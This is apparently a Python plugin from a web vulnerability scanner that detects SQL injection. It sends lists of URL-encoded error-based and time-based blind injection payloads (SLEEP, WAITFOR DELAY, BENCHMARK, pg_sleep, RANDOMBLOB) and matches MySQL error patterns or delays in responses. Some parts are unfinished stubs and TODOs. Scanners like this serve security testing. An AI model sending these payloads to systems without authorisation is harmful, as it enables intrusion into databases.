#! usr/bin/python 
#coding=utf-8 

import re
from copy import deepcopy

from moudle.lurkscan.pluginmanager import Check
from moudle.lurkscan.plugins.sqlinject.sqlinject import SqlInject
from moudle.lurkscan.plugins.sqlinject.sqlinject import InjectEntity

class ErrorInject(SqlInject, Check):
	
	def __init__(self):
		self.__errors = self.load_errors()
	
	def _load_payloads(self):
		return ['%27','%22','%27%27','%27%22',';',')','%27)','%22)','%22);','%27;','%22;','%%27','%%22','%%27)','%%22)','%27))','%22))','%22)))']
	
	def load_errors(self):
		return [r'SQL syntax.*?MySQL', 
				r'Warning.*?mysql_', 'MySqlException \(0x', 
				r'valid MySQL result', 
				r'check the manual that corresponds to your (MySQL|MariaDB) server version', 
				r'MySqlClient\.',
				r'MySqlClient\.',
				r'com\.mysql\.jdbc\.exceptions']
	
	def _check(self, inject):
		for error in self.__errors:
			if re.search(error, inject.content, re.I):
				return error
		
class TimeInject(SqlInject, Check):
	
	def __init__(self):
		#测试正常响应时间的次数
		self.__test_num = 3
		#响应时间平均数
		self.__mean = 0
		#TODO 写死为5秒，增加多个秒
		self.time = 4
	
	def _load_payloads(self):
		payloads_raw = ['', '', '', '%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))bAKL)%20AND%20%27vRxe%27%3d%27vRxe', '%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))YjoC)%20AND%20%27%%27%3d%27', '%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))nQIP)', '%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))nQIP)--', '%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))nQIP)#', 'SLEEP(5)#', 'SLEEP(5)--%20', 'SLEEP(5)%3d%22', 'SLEEP(5)%3d%27', '%20or%20SLEEP(5)', '%20or%20SLEEP(5)#', '%20or%20SLEEP(5)--', '%20or%20SLEEP(5)%3d%22', '%20or%20SLEEP(5)%3d%27', 'waitfor%20delay%20%2700:00:05%27', 'waitfor%20delay%20%2700:00:05%27--%20', 'waitfor%20delay%20%2700:00:05%27#', 'benchmark(50000000,MD5(1))', 'benchmark(50000000,MD5(1))--%20', 'benchmark(50000000,MD5(1))#', '%20or%20benchmark(50000000,MD5(1))', '%20or%20benchmark(50000000,MD5(1))--%20', '%20or%20benchmark(50000000,MD5(1))#', 'pg_SLEEP(5)', 'pg_SLEEP(5)--%20', 'pg_SLEEP(5)#', '%20or%20pg_SLEEP(5)', '%20or%20pg_SLEEP(5)--%20', '%20or%20pg_SLEEP(5)#', '%27\%22', '%20AnD%20SLEEP(5)', '%20AnD%20SLEEP(5)--', '%20AnD%20SLEEP(5)#', '&&SLEEP(5)', '&&SLEEP(5)--', '&&SLEEP(5)#', '%27%20AnD%20SLEEP(5)%20ANd%20%271', '%27&&SLEEP(5)&&%271', '%20ORDER%20BY%20SLEEP(5)', '%20ORDER%20BY%20SLEEP(5)--%20', '%20ORDER%20BY%20SLEEP(5)#', '(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))ecMj)', '(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))ecMj)#', '(SELECT%20*%20FROM%20(SELECT(SLEEP(5)))ecMj)--', '+benchmark(3200,SHA1(1))+%27', '%20+%20SLEEP(10)%20+%20%27', '%20RANDOMBLOB(500000000/2)', '%20AND%202947%3dLIKE(%27ABCDEFG%27,UPPER(HEX(RANDOMBLOB(500000000/2))))', '%20OR%202947%3dLIKE(%27ABCDEFG%27,UPPER(HEX(RANDOMBLOB(500000000/2))))', '%20RANDOMBLOB(1000000000/2)', '%20AND%202947%3dLIKE(%27ABCDEFG%27,UPPER(HEX(RANDOMBLOB(1000000000/2))))', '%20OR%202947%3dLIKE(%27ABCDEFG%27,UPPER(HEX(RANDOMBLOB(1000000000/2))))', 'SLEEP(2)/*%27%20or%20SLEEP(2)%20or%20%27%22%20or%20SLEEP(1)%20or%20%22*/']
		#['%27%20AND%20SLEEP(5)%20AND%20%27TgYR%27%3d%27TgYR']
		payloads = []
		"""for i in range(0, self.__test_num):
			payloads.append('')
		for i in range(2, len(payloads)):
			#for t in self.time:
			#	for y in range(0, len(payloads_raw)):
				payloads.append(payloads_raw[y].replace('{time}',str(t)))"""
		return payloads_raw
	
	def get_timeout(self):
		return 7
	
	def _check(self, inject):
		diff = inject.time_diff()
		#计算平均值
		if self.__test_num > 0:
			if not self.__mean:
				self.__mean = diff
			self.__mean = (self.__mean + diff)/2
		else:
			#时间差大于最小的sleep时间则是时间盲注
			self.__test_num = 3
			#TODO 判断不准确，下版本升级
			return (diff - self.__mean) >= self.time
		self.__test_num -= 1
		
class UnionInject(SqlInject):
	pass